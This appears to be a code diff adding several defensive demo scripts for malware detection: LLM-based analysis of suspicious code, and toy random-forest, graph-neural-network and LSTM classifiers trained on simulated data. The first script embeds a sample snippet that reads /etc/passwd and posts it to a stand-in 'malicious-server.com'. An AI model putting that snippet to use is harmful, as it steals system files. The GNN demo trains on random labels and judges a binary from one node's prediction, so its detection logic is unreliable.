@@ -1,0 +1,245 @@
+import openai
+
+# Initialize the OpenAI API with your API key
+openai.api_key = 'YOUR_OPENAI_API_KEY'
+
+def analyze_code_with_chatgpt(code_snippet):
+    # Analyze a code snippet using ChatGPT
+    prompt = {
+        "model": "gpt-3.5-turbo",  # Ensure this is a valid chat model name
+        "messages": [
+            {"role": "system", "content": "You are a helpful assistant."},
+            {"role": "user", "content": f"Please analyze the following code snippet for any suspicious or malicious behavior:\n\n{code_snippet}\n\nWhat can you infer from this code?"}
+        ]
+    }
+
+    # Send the prompt to ChatGPT using the chat completions endpoint
+    response = openai.ChatCompletion.create(**prompt)
+
+    return response.choices[0].message['content'].strip()
+
+# Sample suspicious code snippet
+code_snippet = """
+def suspicious_function():
+    import os
+    # Read environment variables
+    user_data = os.environ.get('USER_DATA')
+
+    # Check if a specific file exists
+    if os.path.exists('/etc/passwd'):
+        with open('/etc/passwd', 'r') as file:
+            content = file.read()
+
+    # Send the content to an external server
+    requests.post('http://malicious-server.com/upload', data=content)
+
+    print("This is a test function.")
+"""
+
+# Analyzing the suspicious code snippet
+result = analyze_code_with_chatgpt(code_snippet)
+print(result)
+
+
+
+
+--------------------------------------------------------------------
+
+import openai
+
+# Initialize OpenAI API
+openai.api_key = 'YOUR_OPENAI_API_KEY'
+
+def analyze_with_chatgpt(software_description):
+    # Simulate a conversation with ChatGPT to analyze a software's behavior.
+    # Parameters:
+    # software_description (str): A description of the software or its behavior.
+    # Returns:
+    # str: ChatGPT's opinion on whether the software is potentially malicious.
+
+    # Start a conversation with ChatGPT using the chat/completions endpoint
+    response = openai.ChatCompletion.create(
+        model="gpt-3.5-turbo",
+        messages=[
+            {"role": "system", "content": "You are a helpful assistant."},
+            {"role": "user", "content": f"I've observed a software with the following behavior: {software_description}. Do you think this could be malware?"}
+        ]
+    )
+
+    # Extract ChatGPT's response
+    chatgpt_response = response.choices[0].message['content'].strip()
+
+    return chatgpt_response
+
+# Example usage
+software_description = "The software tries to access user's contacts without permission and sends data to an unknown server"
+result = analyze_with_chatgpt(software_description)
+print(result)
+
+
+
+--------------------------------------------------------------------
+
+
+from sklearn.ensemble import RandomForestClassifier
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import accuracy_score
+import pandas as pd
+
+# Simulated executable file data (for demonstration purposes)
+# Features: [File Size, Number of Sections, Entropy, Suspicious APIS]
+data = {
+    'File Size': [2000, 2200, 2500, 2750, 8000, 8588, 9000, 9500],
+    'Num Sections': [3, 3, 4, 4, 8, 8, 9, 9],
+    'Entropy': [6.5, 6.6, 6.7, 6.8, 7.5, 7.6, 7.7, 7.8],
+    'Suspicious_APIs': [0, 1, 0, 1, 5, 6, 5, 6],
+    'Is Malware': [0, 0, 0, 0, 1, 1, 1, 1]  # for benign, 1 for malware
+}
+
+df = pd.DataFrame(data)
+
+# Features and Labels
+X = df[['File Size', 'Num Sections', 'Entropy', 'Suspicious_APIs']]
+y = df['Is Malware']
+
+# Split the data into training and testing sets
+X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
+
+# Initialize the Random Forest classifier
+clf = RandomForestClassifier(n_estimators=50)
+
+# Train the classifier
+clf.fit(X_train, y_train)
+
+# Make predictions on the test set
+y_pred = clf.predict(X_test)
+
+# Calculate the accuracy
+accuracy = accuracy_score(y_test, y_pred)
+print(f"Accuracy: {accuracy * 100}%")
+
+# Now you can use clf.predict() to make predictions on new executable file data
+
+
+--------------------------------------------------------------------
+
+
+import torch
+import torch.nn.functional as F
+from torch_geometric.nn import GCNConv
+from torch_geometric.data import Data, DataLoader
+import random
+
+# Sample function to generate CFG data from a malware binary
+def generate_CFG(binary_path, num_samples=1000):
+    data_list = []
+    for _ in range(num_samples):
+        num_nodes = random.randint(5, 20)
+        nodes = torch.randn((num_nodes, 2))
+        edges = torch.randint(0, num_nodes, (2, random.randint(num_nodes - 1, num_nodes * (num_nodes - 1) // 2)))
+
+        # Randomly assign a Label (0: benign, 1: metamorphic malware)
+        label = torch.tensor([random.randint(0, 1)], dtype=torch.long)
+
+        data = Data(x=nodes, edge_index=edges, y=label)
+        data_list.append(data)
+
+    return data_list
+
+# Define the GNN model
+class GNNModel(torch.nn.Module):
+    def __init__(self):
+        super(GNNModel, self).__init__()
+        self.conv1 = GCNConv(2, 16)
+        self.conv2 = GCNConv(16, 2)
+
+    def forward(self, data):
+        x, edge_index = data.x, data.edge_index
+        x = self.conv1(x, edge_index)
+        x = F.relu(x)
+        x = F.dropout(x, training=self.training)
+        x = self.conv2(x, edge_index)
+        return F.log_softmax(x, dim=1)
+
+# Generate CFG data from hypothetical malware binaries
+dataset = generate_CFG("path_to_malware_binary")
+loader = DataLoader(dataset, batch_size=32, shuffle=True)
+
+# Initialize and train the GNN model
+model = GNNModel()
+optimizer = torch.optim.Adam(model.parameters(), lr=0.01)
+model.train()
+
+for epoch in range(100):
+    for data in loader:
+        optimizer.zero_grad()
+        out = model(data)
+        y_true = data.y[data.batch]
+        loss = F.nll_loss(out, y_true)
+        loss.backward()
+        optimizer.step()
+
+# Inference on a single sample
+model.eval()
+sample_data = dataset[0]
+out = model(sample_data)
+pred = out.max(dim=1)[1]
+
+# Check if the first node in the binary is detected as metamorphic malware
+if pred[0].item() == 1:
+    print("The first node in the binary is detected as metamorphic malware!")
+else:
+    print("The first node in the binary is benign.")
+
+
+--------------------------------------------------------------------
+
+from tensorflow.keras.models import Sequential
+from tensorflow.keras.layers import LSTM, Dense
+from sklearn.model_selection import train_test_split
+from sklearn.metrics import accuracy_score, classification_report
+import numpy as np
+
+# Simulated memory dump data
+# Features: [Heap Size, Stack Size, Threads, API Calls, Loaded DLLs, Timers, Semaphores, Files, Sockets, Events, IPC]
+X = np.array([
+    [200, 50, 2, 5, 1, 0, 1, 2, 8, 8, 0],  # benign
+    [220, 55, 2, 4, 1, 0, 1, 2, 0, 0, 0],  # benign
+    [500, 200, 10, 20, 5, 2, 3, 5, 2, 1, 1],  # malicious
+    [210, 52, 2, 5, 1, 0, 1, 2, 0, 0, 0],  # benign
+    [488, 190, 9, 18, 4, 2, 3, 4, 2, 1, 1]   # malicious
+])
+
+# Labels: 0 for benign, 1 for malicious
+y = np.array([0, 0, 1, 0, 1])
+
+# Reshape X for LSTM
+X = np.reshape(X, (X.shape[0], 1, X.shape[1]))
+
+# Split the data
+X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
+
+# Initialize the LSTM model
+model = Sequential()
+model.add(LSTM(50, input_shape=(X_train.shape[1], X_train.shape[2])))
+model.add(Dense(1, activation='sigmoid'))
+
+# Compile the model
+model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
+
+# Train the model
+model.fit(X_train, y_train, epochs=50, batch_size=1)
+
+# Make predictions on the test set
+y_pred = (model.predict(X_test) > 0.5).astype(int)
+
+# Print the accuracy and classification report
+print("Accuracy:", accuracy_score(y_test, y_pred))
+print("Classification Report:")
+print(classification_report(y_test, y_pred))
+
+
+
+--------------------------------------------------------------------
+
+
